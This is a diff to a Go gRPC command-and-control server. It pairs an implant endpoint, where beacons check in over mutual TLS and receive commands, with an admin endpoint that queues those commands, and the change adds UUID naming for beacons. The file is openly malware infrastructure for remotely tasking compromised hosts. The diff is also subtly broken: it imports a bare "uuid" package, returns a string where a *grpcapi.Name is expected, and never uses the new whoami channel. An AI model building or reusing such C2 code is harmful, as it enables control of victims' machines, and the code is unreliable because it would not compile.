@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"uuid"
 	"crypto/tls"
 	"crypto/x509"
 	"fmt"
@@ -17,19 +18,18 @@ import (
 
 type implantServer struct {
 	work, output chan *grpcapi.Command // expect the whoami parameter from the beacon
-	name string
+	whoami chan *grpcapi.Name
 }
 
 type adminServer struct {
 	work, output chan *grpcapi.Command
 }
 
-func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
+func NewImplantServer(work, output chan *grpcapi.Command, whoami chan *grpcapi.Name) *implantServer {
 	s := new(implantServer)
-	name = "test"
 	s.work = work
 	s.output = output
-	s.name = name
+	s.whoami = whoami
 	return s
 }
 
@@ -68,25 +68,24 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 	return res, nil
 }
 
-func (s *implantServer) fetchName(ctx context.Context, empty *grpcapi.Command) (*grpcapi.Empty, error) {
+func (s *implantServer) FetchName(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Name, error) {
 	log.Printf("New beacon: test")
-	var name = new(grpcapi.Name)
-	name = s.name
-
+	var name = uuid.New().String()
 	return name, nil
 }
 
 func main() {
-        var (
-                implantListener, adminListener net.Listener
-                err                            error
-                opts                           []grpc.ServerOption
-                work, output				   chan *grpcapi.Command
-        )
+	var (
+		implantListener, adminListener net.Listener
+		err                            error
+		opts                           []grpc.ServerOption
+		work, output				   chan *grpcapi.Command
+		whoami chan *grpcapi.Name
+	)
 
-		certificate, err := tls.LoadX509KeyPair(
-	"/etc/server/certs/server.crt",
-	"/etc/server/certs/server.key",
+	certificate, err := tls.LoadX509KeyPair(
+		"/etc/server/certs/server.crt",
+		"/etc/server/certs/server.key",
 	)
 
 	certPool := x509.NewCertPool()
@@ -106,25 +105,26 @@ func main() {
 		ClientCAs:    certPool,
 	}
 
-        work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
-        implant := NewImplantServer(work, output)
-        admin := NewAdminServer(work, output)
-        if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 8010)); err != nil {
-                log.Fatal(err)
-        }
-        if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
-                log.Fatal(err)
-        }
+	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+	whoami = make(chan *grpcapi.Name)
+	implant := NewImplantServer(work, output, whoami)
+	admin := NewAdminServer(work, output)
+	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 8010)); err != nil {
+		log.Fatal(err)
+	}
+	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
+		log.Fatal(err)
+	}
 
-        //serverOption := []grpc.ServerOption{grpc.Creds(credentials.NewTLS(tlsConfig))}
+	//serverOption := []grpc.ServerOption{grpc.Creds(credentials.NewTLS(tlsConfig))}
 
-        grpcImplantServer := grpc.NewServer(grpc.Creds(credentials.NewTLS(tlsConfig)))
-        grpcAdminServer := grpc.NewServer(opts...)
-        grpcapi.RegisterImplantServer(grpcImplantServer, implant)
-        grpcapi.RegisterAdminServer(grpcAdminServer, admin)
+	grpcImplantServer := grpc.NewServer(grpc.Creds(credentials.NewTLS(tlsConfig)))
+	grpcAdminServer := grpc.NewServer(opts...)
+	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
+	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 
-        go func() {
-                grpcImplantServer.Serve(implantListener)
-        }()
-        grpcAdminServer.Serve(adminListener)
+	go func() {
+		grpcImplantServer.Serve(implantListener)
+	}()
+	grpcAdminServer.Serve(adminListener)
 }
